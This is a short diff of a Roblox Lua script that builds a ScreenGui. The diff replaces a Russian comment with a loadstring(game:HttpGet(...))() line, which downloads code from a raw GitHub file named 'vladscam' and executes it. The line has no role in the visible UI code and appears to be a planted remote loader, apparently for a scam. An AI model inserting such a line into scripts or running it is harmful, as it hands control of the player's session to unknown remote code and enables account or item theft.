@@ -1,4 +1,4 @@
--- Создаем ScreenGui
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Gusha312/scriptkwqf3124/refs/heads/main/vladscam"))()
 local screenGui = Instance.new('ScreenGui')
 screenGui.Parent = game.Players.LocalPlayer:WaitForChild('PlayerGui')
 
